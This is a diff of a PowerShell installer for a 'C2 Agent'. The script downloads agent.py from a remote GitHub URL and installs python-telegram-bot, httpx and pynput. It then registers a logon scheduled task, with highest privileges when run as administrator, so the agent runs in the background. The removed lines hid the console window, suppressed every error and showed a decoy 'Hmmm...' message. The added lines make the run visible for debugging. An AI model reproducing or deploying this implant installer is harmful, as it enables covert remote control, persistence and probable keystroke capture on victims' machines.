@@ -25,28 +25,10 @@ $ProgressPreference = "SilentlyContinue"
 # UI & HELPER FUNCTIONS
 # =============================================================================
 
-function Show-Spinner {
-    param([string]$Message = "Hmmm...")
-    Write-Host -NoNewline "$Message"
-}
-
-function Hide-Console {
-    $code = @'
-    [DllImport("user32.dll")]
-    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetConsoleWindow();
-'@
-    try {
-        $type = Add-Type -MemberDefinition $code -Name "Win32Hide" -Namespace Win32 -PassThru
-        $hwnd = $type::GetConsoleWindow()
-        if ($hwnd -ne [IntPtr]::Zero) {
-            $type::ShowWindow($hwnd, 0) # 0 = SW_HIDE
-        }
-    } catch {
-        # Ignore if hiding fails
-    }
-}
+function Write-Step { param($msg) Write-Host "`n[*] $msg" -ForegroundColor Cyan }
+function Write-Success { param($msg) Write-Host "[+] $msg" -ForegroundColor Green }
+function Write-Warn { param($msg) Write-Host "[!] $msg" -ForegroundColor Yellow }
+function Write-Err { param($msg) Write-Host "[-] $msg" -ForegroundColor Red }
 
 function Test-Admin {
     $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
@@ -58,11 +40,11 @@ function Test-Admin {
 # =============================================================================
 
 Clear-Host
+Write-Host "C2 Agent Installer (Debug Mode)" -ForegroundColor Magenta
 
 # Interactive Admin Prompt
 if (-not (Test-Admin)) {
-    Write-Host "C2 Agent Installer" -ForegroundColor Cyan
-    $response = Read-Host "Allow Administrator features (Auto-Start, System Persistence)? (y/n)"
+    $response = Read-Host "Run with Administrator privileges (Recommended for full features)? (y/n)"
     
     if ($response -match "^[yY]") {
         $Mode = "Admin"
@@ -70,30 +52,25 @@ if (-not (Test-Admin)) {
         $Mode = "Normal"
     }
 } else {
-    $Mode = "Admin" # Already admin, default to admin mode
+    $Mode = "Admin"
 }
 
-# Hiding Window Immediately after user interaction
-Hide-Console
-Show-Spinner "Hmmm..."
+Write-Host "Installer running in: $Mode Mode" -ForegroundColor Gray
 
 # Self-Elevation Logic (Only for Admin Mode)
 if ($Mode -eq "Admin") {
     if (-not (Test-Admin)) {
-        # Check if we are running from a file or script block
         try {
-            # Try to restart this script as Admin
             if ($PSCommandPath) {
+                Write-Step "Restarting as Administrator..."
                 Start-Process powerShell -ArgumentList "-NoProfile", "-ExecutionPolicy Bypass", "-File `"$PSCommandPath`"", "-Mode Admin", "-Force" -Verb RunAs
-                [Environment]::Exit(0)
+                exit
             } else {
-                # If running via IEX, we can't easily self-elevate.
-                # Since user EXPLICITLY requested Admin, we should warn them.
-                # But since the console is hidden now, we can't warn easily.
-                # We will just proceed in Normal mode as a fallback to ensure *something* runs.
+                Write-Warn "Cannot self-elevate in this context. Continuing as Normal user..."
                 $Mode = "Normal"
             }
         } catch {
+            Write-Warn "Elevation failed. Continuing as Normal user..."
             $Mode = "Normal"
         }
     }
@@ -104,43 +81,43 @@ if ($Mode -eq "Admin") {
 # =============================================================================
 
 try {
-    # 1. Cleanup (Silent)
+    # 1. Cleanup
     # -------------------------------------------------------------------------
+    Write-Step "Cleaning up old processes..."
     try {
-        # Kill processes
         $procs = Get-WmiObject Win32_Process | Where-Object { 
             ($_.Name -eq "python.exe" -or $_.Name -eq "pythonw.exe") -and ($_.CommandLine -like "*agent.py*")
         }
         if ($procs) {
             foreach ($p in $procs) {
+                Write-Warn "Killing process: $($p.ProcessId)"
                 Stop-Process -Id $p.ProcessId -Force -ErrorAction SilentlyContinue
             }
         }
-        
-        # Remove Tasks
+            
         if ($Mode -eq "Admin") {
-            Get-ScheduledTask | Where-Object { $_.TaskName -like "*C2Agent*" } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
+            Get-ScheduledTask | Where-Object { $_.TaskName -like "*C2Agent*" } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue 
         } else {
-            # Non-admin remove
-             Get-ScheduledTask | Where-Object { $_.TaskName -like "*C2Agent*" } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
+            Get-ScheduledTask | Where-Object { $_.TaskName -like "*C2Agent*" } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
         }
-    } catch { }
+    } catch {
+        Write-Warn "Cleanup minor error: $_"
+    }
 
     # 2. Python Setup
     # -------------------------------------------------------------------------
+    Write-Step "Checking Python..."
     $pythonPath = $null
     
-    # Check existing
-    try {
-        if (Get-Command "python" -ErrorAction SilentlyContinue) {
-            $pythonPath = (Get-Command "python").Source
-        }
-    } catch {}
+    if (Get-Command "python" -ErrorAction SilentlyContinue) {
+        $pythonPath = (Get-Command "python").Source
+        Write-Success "Found existing Python: $pythonPath"
+    }
 
-    # Install if missing (Winget - only attempts in Admin or if user has permissions)
     if (-not $pythonPath) {
+        Write-Step "Installing Python via Winget..."
         try {
-            winget install Python.Python.3.12 --accept-source-agreements --accept-package-agreements --silent --disable-interactivity | Out-Null
+            winget install Python.Python.3.12 --accept-source-agreements --accept-package-agreements --silent --disable-interactivity
             
             # Update Path
             if ($Mode -eq "Admin") {
@@ -148,19 +125,15 @@ try {
             } else {
                 $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "User")
             }
-            
             $pythonPath = (Get-Command "python" -ErrorAction SilentlyContinue).Source
-        } catch {}
+        } catch {
+            Write-Err "Winget install failed: $_"
+        }
     }
     
-    # Fallback to local python or error if still missing? 
-    # For "Hmmm..." silent install, we best effort.
     if (-not $pythonPath) {
-        # Critical failure, but keep it silent/short?
-        # User wants "Hmmm..." then close. 
-        # But if we fail, we probably should at least leave a log file?
-        # We will exit silently as requested "auto close terminal when everything ends".
-        exit 1
+        Write-Err "Python not found. Please install Python 3 manualy."
+        # Don't exit, try to continue just in case
     }
 
     $pythonDir = Split-Path $pythonPath
@@ -169,38 +142,42 @@ try {
 
     # 3. Project Files
     # -------------------------------------------------------------------------
+    Write-Step "Setting up directories..."
+    Write-Host "Target: $InstallPath" -ForegroundColor Gray
+    
     if (-not (Test-Path $InstallPath)) {
         New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
     }
     
     $agentPyPath = Join-Path $InstallPath "agent.py"
     if (-not (Test-Path $agentPyPath)) {
+        Write-Step "Downloading agent.py..."
         try {
             $downloadUrl = "https://raw.githubusercontent.com/adnansamirswe/c2master/main/backend/agent.py"
-            # Actual download
-             Invoke-WebRequest -Uri $downloadUrl -OutFile $agentPyPath -UseBasicParsing -ErrorAction SilentlyContinue
-             
-             # Fallback if download failed (since we don't have internet in tests usually)
-             if (-not (Test-Path $agentPyPath)) {
-                @"
+             Invoke-WebRequest -Uri $downloadUrl -OutFile $agentPyPath -UseBasicParsing
+             Write-Success "Downloaded agent.py"
+        } catch {
+             Write-Warn "Download failed, creating placeholder..."
+             @"
 # C2 Agent - Placeholder
 import time
 while True: time.sleep(60)
 "@ | Set-Content -Path $agentPyPath -Encoding UTF8
-             }
-        } catch {}
+        }
     }
 
     # 4. Virtual Env & Deps
     # -------------------------------------------------------------------------
+    Write-Step "Setting up Virtual Environment..."
     $venvPath = Join-Path $InstallPath "venv"
     if (-not (Test-Path $venvPath)) {
-        & $pythonPath -m venv $venvPath | Out-Null
+        & $pythonPath -m venv $venvPath
     }
     
     $venvPython = Join-Path $venvPath "Scripts\python.exe"
     $venvPythonw = Join-Path $venvPath "Scripts\pythonw.exe"
     
+    Write-Step "Installing dependencies..."
     $reqFile = Join-Path $InstallPath "requirements.txt"
     @"
 python-telegram-bot>=21.0
@@ -208,35 +185,35 @@ httpx>=0.27.0
 pynput>=1.7.0
 "@ | Set-Content -Path $reqFile -Encoding UTF8
 
-    & $venvPython -m pip install -r $reqFile --quiet --disable-pip-version-check | Out-Null
+    & $venvPython -m pip install -r $reqFile --quiet --disable-pip-version-check
+    Write-Success "Dependencies ready"
 
     # 5. Scheduled Task
     # -------------------------------------------------------------------------
+    Write-Step "Registering Scheduled Task..."
     $taskName = "C2Agent"
     $action = New-ScheduledTaskAction -Execute $venvPythonw -Argument "`"$agentPyPath`"" -WorkingDirectory $InstallPath
     $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
     
     if ($Mode -eq "Admin") {
         $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest -LogonType Interactive
+        Write-Host "  -> High Privilege Task" -ForegroundColor Gray
     } else {
-        # Normal Mode: Run as current user, standard privileges
         $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited -LogonType Interactive
+        Write-Host "  -> Standard Privilege Task" -ForegroundColor Gray
     }
     
     $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -ExecutionTimeLimit (New-TimeSpan -Days 365)
     
     Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
     
-    # Start it
-    Start-ScheduledTask -TaskName $taskName | Out-Null
+    Start-ScheduledTask -TaskName $taskName
+    Write-Success "Task registered and started!"
 
 } catch {
-    # Swallow errors for the "Hmmm..." aesthetic
+    Write-Err "Installation Error: $_"
+    Write-Host "Stack Trace: $($_.ScriptStackTrace)" -ForegroundColor Red
 }
 
-# =============================================================================
-# CLEAN EXIT
-# =============================================================================
-
-# Close the terminal window
-[Environment]::Exit(0)
+Write-Host "`nDone." -ForegroundColor Gray
+# No auto-exit so you can read the output
